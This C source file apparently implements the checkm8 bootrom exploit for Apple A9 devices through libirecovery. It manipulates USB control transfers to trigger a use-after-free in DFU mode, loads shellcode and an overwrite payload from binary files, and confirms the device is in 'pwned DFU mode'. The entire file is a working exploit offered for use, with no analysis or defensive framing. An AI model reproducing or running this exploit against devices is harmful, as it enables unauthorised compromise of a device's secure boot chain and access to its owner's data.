#include <stdio.h>
#include "libirecovery.h"
#include <string.h>
#include <unistd.h>


unsigned char blank_buf[0x100]; 



int usb_req_leak(irecv_client_t client){
    return irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, blank_buf, 0x40, 1);
}


int usb_req_stall(irecv_client_t client){
    return irecv_usb_control_transfer(client,  0x2, 3,   0x0,  0x80, blank_buf, 0x0, 10);
}

int dfu_abort(irecv_client_t client) {
      return irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
}

void usb_leak(irecv_client_t client) {
    unsigned char buf[0x800];
    memset(buf, 'A', 0x800);
    irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, 1);
    memset(buf, 'A', 0x500);
    irecv_usb_control_transfer(client, 0, 0, 0, 0, buf, 0x500, 10);
    
    }
void load_shellcode(irecv_client_t client, unsigned char *overwrite, unsigned char *shellcode) {
     irecv_usb_control_transfer(client,  0, 0,   0,  0, overwrite, 0x30, 100);
     irecv_usb_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x74 ,100);
}

int checkm8(irecv_client_t client, unsigned long long ecid) {


printf("*** A9 checkm8 exploit ***\n");


const struct irecv_device_info* info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[checkm8]");
    if(pwnd_str) {
        irecv_close(client);
        printf("Not executing exploit. Device is already in pwned DFU mode\n");
    	return 0;
        
    }
   
   


usb_leak(client);


dfu_abort(client);



irecv_open_with_ecid_and_attempts(&client, 0, 5);
if (!client) {
    printf("Could not connect\n");
    return -1;
}


usb_req_stall(client);



usb_req_leak(client);
usb_req_leak(client);
usb_req_leak(client);


unsigned char overwrite[48];
unsigned char shellcode[116];




FILE *fp = fopen("overwrite_s8003.bin", "rb");


fread(overwrite, 48, 1, fp);
fclose(fp);



fp = fopen("checkm8-shellcode.bin", "rb");

fread(shellcode, 116, 1, fp);
fclose(fp);




load_shellcode(client, overwrite, shellcode);


irecv_reset(client);

irecv_open_with_ecid_and_attempts(&client, 0, 5);
if (!client) {
    printf("Could not connect\n");
    return -1;

}

    
   

const struct irecv_device_info* info2 = irecv_get_device_info(client);
    char* pwnd_str2 = strstr(info2->serial_string, "PWND:[checkm8]");
    if(pwnd_str2) {
        irecv_close(client);
        printf("Device is now in pwned DFU mode\n");
    	return 0;
        
    }
    else {
       irecv_close(client);
       printf("Exploit failed. Device is not in pwned DFU mode\n");
       return -1;
    }


return 0;

}

int main() {

irecv_client_t client = NULL;
unsigned long long ecid = NULL;


    
irecv_error_t err = irecv_open_with_ecid(&client, ecid);
if (err) {
    printf("Could not connect\n");
    irecv_close(client);
    return -1;
}

checkm8(client, ecid);



return 0;
}
